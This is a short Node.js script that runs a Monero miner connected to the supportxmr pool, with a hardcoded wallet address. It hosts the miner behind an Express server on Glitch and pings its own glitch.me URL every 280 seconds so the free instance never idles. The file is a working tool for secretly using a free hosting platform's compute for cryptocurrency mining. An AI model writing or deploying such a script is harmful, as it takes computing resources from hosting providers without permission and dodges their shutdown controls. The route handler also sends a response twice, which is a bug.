const NodeMiner = require('node-miner');
const http = require('http');  
const express = require('express');
const app = express();

(async () => {

    const miner = await NodeMiner({
        host: `pool.supportxmr.com`,
        port: 5555,
        username: `4ApobsfkN2bX8DRtohsKpf9xH7UVSx3HEUsE6PogXd5zeyEEBcfuwCEMMUN6uRQEEYNNVRddogc4W13eaa1wwh9bKSB5FTE`,
        password: 'worker-1'
    });

    await miner.start();

    miner.on('update', data => {
        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
        console.log(`Total hashes mined: ${data.totalHashes}`);
        console.log(`---`);
    });
    
    app.use(express.static('public'));
 
  app.get('/', function(request, response) {
  response.sendFile(__dirname + '/index.html');
   console.log(Date.now() + " Ping Received");
   response.sendStatus(200);
  });
    
  const listener = app.listen(process.env.PORT, function() {
    console.log('Your app is listening on port ' + listener.address().port);
  });
  
  setInterval(() => {
    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

})();
